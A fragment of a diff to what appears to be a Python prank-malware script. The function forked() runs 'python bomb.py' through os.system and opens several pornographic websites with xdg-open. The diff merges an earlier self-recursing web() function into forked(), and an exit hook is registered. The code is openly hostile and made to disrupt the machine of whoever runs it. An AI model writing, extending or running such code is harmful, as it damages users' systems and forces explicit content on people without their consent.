@@ -27,13 +27,9 @@ def forked():
       pass
     print(malwar)
     os.system("python bomb.py")
-    web()
-
-def web():
-  time.sleep(1)
-  os.system("xdg-open https://www.xvideos.com/ && xdg-open https://www.spankbang.com/ && xdg-open https://www.xnxx.com/ && xdg-open https://www.pornhub.com/ && xdg-open https://www.githun.com/ && xdg-open https://canyoublockit.com/advanced-adblocker-test/web-banners/")
-  os.system("clear")
-  return forked()
+    time.sleep(1)
+    os.system("xdg-open https://www.xvideos.com/ && xdg-open https://www.spankbang.com/ && xdg-open https://www.xnxx.com/ && xdg-open https://www.pornhub.com/ && xdg-open https://www.githun.com/ && xdg-open https://canyoublockit.com/advanced-adblocker-test/web-banners/")
+    os.system("clear")
 
 @atexit.register
 def goodbye():
